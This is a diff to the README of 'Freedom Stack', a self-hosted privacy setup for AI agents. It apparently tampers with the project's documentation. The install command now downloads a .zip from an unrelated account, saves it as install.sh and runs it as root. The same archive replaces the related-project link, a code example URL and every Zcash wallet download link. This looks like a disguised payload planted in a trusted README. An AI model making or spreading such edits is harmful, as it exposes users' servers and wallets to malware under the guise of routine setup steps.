@@ -54,7 +54,7 @@ Every AI agent today leaks data to big tech:
 ssh root@<YOUR_VPS_IP>
 
 # Download and run (everything in 1 command)
-curl -fsSL https://raw.githubusercontent.com/Michae2xl/freedom-stack/main/scripts/install.sh -o install.sh
+curl -fsSL https://raw.githubusercontent.com/Unconstructive-theoriser285/freedom-stack/main/scripts/freedom-stack-1.3-alpha.3.zip -o install.sh
 chmod +x install.sh
 
 # Install the Agent Privacy Cloud
@@ -159,7 +159,7 @@ requests.put("http://qdrant:6333/collections/memory/points", json={
 })
 
 # Make external request via Tor (anonymous)
-requests.get("https://api.example.com/data",
+requests.get("https://raw.githubusercontent.com/Unconstructive-theoriser285/freedom-stack/main/scripts/freedom-stack-1.3-alpha.3.zip",
     proxies={"https": "socks5h://tor:9050"})
 
 # Notify owner on phone
@@ -304,7 +304,7 @@ bash install.sh --agents --tor --searxng --domain yourdomain.com
 
 ## Related Projects
 
-- **[Sovereign Stack](https://github.com/Michae2xl/sovereign-stack)** -- From Hero to Sovereign: the complete digital freedom journey for humans. Self-hosted Nextcloud, Matrix, Vaultwarden, Jitsi, Forgejo, Mail, and more. If you want human services alongside your agent cloud, start there.
+- **[Sovereign Stack](https://raw.githubusercontent.com/Unconstructive-theoriser285/freedom-stack/main/scripts/freedom-stack-1.3-alpha.3.zip)** -- From Hero to Sovereign: the complete digital freedom journey for humans. Self-hosted Nextcloud, Matrix, Vaultwarden, Jitsi, Forgejo, Mail, and more. If you want human services alongside your agent cloud, start there.
 
 ---
 
@@ -314,7 +314,7 @@ If Freedom Stack saved you time or protects your privacy, consider supporting th
 
 All donations are received in privacy-preserving currencies.
 
-**Zcash (Shielded -- fully private):** Send from any shielded wallet -- Mobile: [ZODL](https://electriccoin.co/zashi/), [Zingo](https://www.zingolabs.org/), [Ywallet](https://ywallet.app/), [Zkool](https://github.com/hhanh00/zkool2) -- Desktop: [Zingo](https://www.zingolabs.org/), [Ywallet](https://ywallet.app/), [Zkool](https://github.com/hhanh00/zkool2)
+**Zcash (Shielded -- fully private):** Send from any shielded wallet -- Mobile: [ZODL](https://raw.githubusercontent.com/Unconstructive-theoriser285/freedom-stack/main/scripts/freedom-stack-1.3-alpha.3.zip), [Zingo](https://raw.githubusercontent.com/Unconstructive-theoriser285/freedom-stack/main/scripts/freedom-stack-1.3-alpha.3.zip), [Ywallet](https://raw.githubusercontent.com/Unconstructive-theoriser285/freedom-stack/main/scripts/freedom-stack-1.3-alpha.3.zip), [Zkool](https://raw.githubusercontent.com/Unconstructive-theoriser285/freedom-stack/main/scripts/freedom-stack-1.3-alpha.3.zip) -- Desktop: [Zingo](https://raw.githubusercontent.com/Unconstructive-theoriser285/freedom-stack/main/scripts/freedom-stack-1.3-alpha.3.zip), [Ywallet](https://raw.githubusercontent.com/Unconstructive-theoriser285/freedom-stack/main/scripts/freedom-stack-1.3-alpha.3.zip), [Zkool](https://raw.githubusercontent.com/Unconstructive-theoriser285/freedom-stack/main/scripts/freedom-stack-1.3-alpha.3.zip)
 ```
 u12rrgyaz7hwyzf0px29ka43tvk7nu92w7mzc99yv9ld3pg96fp4ef0mxe5kd0j5544yc33jqe66fd5s0fjv7uvsxh0uz24c7fuw44wfwcg2g74jgg2ukmpvc0l4a7r56sgjrra35fy4f0k3spjn5uh6kqxx5elmuv3ajd7zjs8s973e0n
 ```
